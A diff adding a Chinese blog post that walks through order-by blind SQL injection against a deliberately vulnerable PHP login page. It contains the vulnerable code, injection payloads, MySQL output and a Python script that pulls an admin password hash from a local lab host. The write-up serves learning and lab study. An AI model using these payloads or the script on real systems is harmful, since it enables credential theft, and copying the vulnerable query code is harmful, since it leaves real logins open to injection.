@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>基于order by的盲注</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/order-by-blind.html" rel="bookmark"
+           title="Permalink to 基于order by的盲注">基于order by的盲注</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-11-23T00:00:00+01:00">
+                <a href='#'>11/23/2017 </a>
+                <a href="/category/sql.html">SQL</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a>
+源代码:</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+  <span class="mh">$db</span><span class="nv">host</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">172.19.0.2</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="mh">$db</span><span class="nv">user</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">root</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="mh">$db</span><span class="nv">pass</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">root</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="mh">$db</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">vul</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="mh">$c</span><span class="nv">onn</span> <span class="o">=</span> <span class="nv">mysqli_connect</span><span class="ss">(</span><span class="mh">$db</span><span class="nv">host</span>,<span class="mh">$db</span><span class="nv">user</span>,<span class="mh">$db</span><span class="nv">pass</span>,<span class="mh">$db</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">mysqli_set_charset</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">onn</span>,<span class="s2">&quot;</span><span class="s">utf8</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+
+  <span class="cm">/* sql</span>
+
+<span class="cm">     create  table `admin` (</span>
+<span class="cm">        `id` int(10) not null primary key auto_increment,</span>
+<span class="cm">        `username` varchar(20) not null ,</span>
+<span class="cm">        `password` varchar(32) not null</span>
+<span class="cm">     );</span>
+<span class="cm">  */</span>
+<span class="nv">function</span>   <span class="nv">filter</span><span class="ss">(</span>$<span class="nv">str</span><span class="ss">)</span>{
+      <span class="mh">$f</span><span class="nv">ilterlist</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">/\(|\)|username|password|where|</span>
+      <span class="nv">case</span><span class="o">|</span><span class="nv">when</span><span class="o">|</span><span class="nv">like</span><span class="o">|</span><span class="nv">regexp</span><span class="o">|</span><span class="nv">into</span><span class="o">|</span><span class="nv">limit</span><span class="o">|=|</span><span class="k">for</span><span class="o">|</span><span class="c1">;/&quot;;</span>
+      <span class="k">if</span><span class="ss">(</span><span class="nv">preg_match</span><span class="ss">(</span><span class="mh">$f</span><span class="nv">ilterlist</span>,<span class="nv">strtolower</span><span class="ss">(</span>$<span class="nv">str</span><span class="ss">)))</span>{
+        <span class="nv">die</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">illegal input!</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+      }
+      <span class="k">return</span> $<span class="nv">str</span><span class="c1">;</span>
+  }
+$<span class="nv">username</span> <span class="o">=</span> <span class="nv">isset</span><span class="ss">(</span>$<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">username</span><span class="s1">&#39;</span>]<span class="ss">)</span>?
+<span class="nv">filter</span><span class="ss">(</span>$<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">username</span><span class="s1">&#39;</span>]<span class="ss">)</span>:<span class="nv">die</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">please input username!</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">password</span> <span class="o">=</span> <span class="nv">isset</span><span class="ss">(</span>$<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">password</span><span class="s1">&#39;</span>]<span class="ss">)</span>?
+<span class="nv">filter</span><span class="ss">(</span>$<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">password</span><span class="s1">&#39;</span>]<span class="ss">)</span>:<span class="nv">die</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">please input password!</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">sql</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">select * from admin where  username =</span>
+ <span class="s1">&#39;</span><span class="s">$username</span><span class="s1">&#39;</span> <span class="nv">and</span> <span class="nv">password</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">$password</span><span class="s1">&#39;</span> <span class="s2">&quot;</span><span class="s">;</span>
+
+$<span class="nv">res</span> <span class="o">=</span> <span class="mh">$c</span><span class="nv">onn</span> <span class="o">-&gt;</span> <span class="nv">query</span><span class="ss">(</span>$<span class="nv">sql</span><span class="ss">)</span><span class="c1">;</span>
+<span class="k">if</span><span class="ss">(</span>$<span class="nv">res</span><span class="o">-&gt;</span><span class="nv">num_rows</span><span class="o">&gt;</span><span class="mi">0</span><span class="ss">)</span>{
+  $<span class="nv">row</span> <span class="o">=</span> $<span class="nv">res</span> <span class="o">-&gt;</span> <span class="nv">fetch_assoc</span><span class="ss">()</span><span class="c1">;</span>
+  <span class="k">if</span><span class="ss">(</span>$<span class="nv">row</span>[<span class="s1">&#39;</span><span class="s">id</span><span class="s1">&#39;</span>]<span class="ss">)</span>{
+     <span class="nv">echo</span> $<span class="nv">row</span>[<span class="s1">&#39;</span><span class="s">username</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+  }
+}<span class="k">else</span>{
+   <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">The content in the password column is the </span><span class="s2">&quot;</span><span class="c1">;</span>
+}
+
+?<span class="o">&gt;</span>
+</pre></div>
+
+
+<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
+<div class="highlight"><pre><span></span><span class="n">username</span><span class="o">=</span><span class="err">&#39;</span><span class="o">^</span><span class="mi">1</span><span class="o">^</span><span class="mi">1</span><span class="o">#&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">1</span>
+</pre></div>
+
+
+<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
+<p><img alt="" src="./images/2.png"></p>
+<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">*</span><span class="mi">0</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">/</span><span class="mi">2</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">^</span><span class="mi">1</span><span class="o">^</span><span class="mi">1</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">-</span><span class="s1">&#39;&#39;</span>
+</pre></div>
+
+
+<p>然后是基于order by的盲注：</p>
+<p>首先是基本知识:</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sting</span>
+<span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)[</span><span class="mi">33</span><span class="p">:</span><span class="mi">127</span><span class="p">]</span>
+<span class="s1">&#39;!&quot;#$%&amp;</span><span class="se">\&#39;</span><span class="s1">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span class="se">\\</span><span class="s1">]^_`abcdefghijklmnopqrstuvwxyz{|}~&#39;</span>
+</pre></div>
+
+
+<p>mysql里面的字符串会默认按照上面这个数值的大小从小到大排列，看下图：</p>
+<p><img alt="" src="./images/3.png"></p>
+<p>比719大的字符串是<code>719;</code>，但是直接比较的话，mysql是会出错的。所以需要转换为16进制来比较。</p>
+<p>总的来说就是拿16进制之后的字符串和admin的密码进行比较，比admin大的话，按照上面php的逻辑，在username为admin2的情况下</p>
+<div class="highlight"><pre><span></span><span class="n">username</span><span class="o">=</span><span class="n">admin2</span><span class="s1">&#39; union select 1,2,0x37313921 order by 3 desc#&amp;password=1 //返回结果admin2</span>
+
+<span class="s1">username=admin2&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="n">x3731393B</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">3</span> <span class="k">desc</span><span class="o">#&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">1</span> <span class="o">//</span><span class="err">返回结果是</span><span class="mi">2</span>
+</pre></div>
+
+
+<p>另外跑出来的都会是大写，看下面的语句:</p>
+<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">hex</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="o">|</span> <span class="n">hex</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="o">|</span> <span class="mi">63</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">hex</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="o">|</span> <span class="n">hex</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">)</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="o">|</span> <span class="mi">43</span>       <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span>   <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="n">x3731393563</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">3</span> <span class="k">desc</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">admin2</span>   <span class="o">|</span> <span class="mi">7195</span><span class="n">ca99696b5a896d067a0fa9dc61a6</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">7195</span><span class="k">c</span>                            <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="mi">2</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">admin</span>   <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="n">x3731393543</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">3</span> <span class="k">desc</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">admin2</span>   <span class="o">|</span> <span class="mi">7195</span><span class="n">ca99696b5a896d067a0fa9dc61a6</span> <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">7195</span><span class="k">C</span>                            <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------+----------------------------------+</span>
+<span class="mi">2</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</pre></div>
+
+
+<p>在mysql里面大小写比较是一样的，即使实际上<code>c</code>的hex要比<code>C</code>大，在python脚本里面按照排列算的话，大写在前面。</p>
+<p><del>
+貌似这里可以分辨大小写的，因为大小写中间有
+[]^_`
+字符串，拿这个和他比。所以比较的时候要出现两次，第一次肯定是大写，如果再和上面的字符串hex比较，结果一样的话
+</del></p>
+<p>上面实际测试，大小写和<code>^</code>比较结果一样，然后费了点时间自己下个脚本复现了下，最后的脚本(中间加的没用的东西是自己调试用的）:</p>
+<div class="highlight"><pre><span></span><span class="c1">#/usr/bin/env python</span>
+<span class="c1"># coding: utf-8</span>
+
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">cest</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)[</span><span class="mi">33</span><span class="p">:</span><span class="mi">127</span><span class="p">]</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/c.php&quot;</span>
+<span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="c1"># payload = res.strip(&#39;&#39;).encode(&#39;hex&#39;) + cest[i:i+1].encode(&#39;hex&#39;)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">res</span> <span class="o">+</span> <span class="n">cest</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+    <span class="n">tmp</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;admin&#39; union select 1,2,0x&quot;</span><span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s2">&quot; order by 3 desc#&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">tmp</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><span class="p">}</span> <span class="p">)</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">continue</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">cest</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">res</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</pre></div>
+
+
+<p>最后，如果要实战中成功条件：</p>
+<ul>
+<li>确定union的列数</li>
+<li>有二值判断的逻辑存在</li>
+</ul>
+<p>貌似没了。。。想到再补充吧。</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
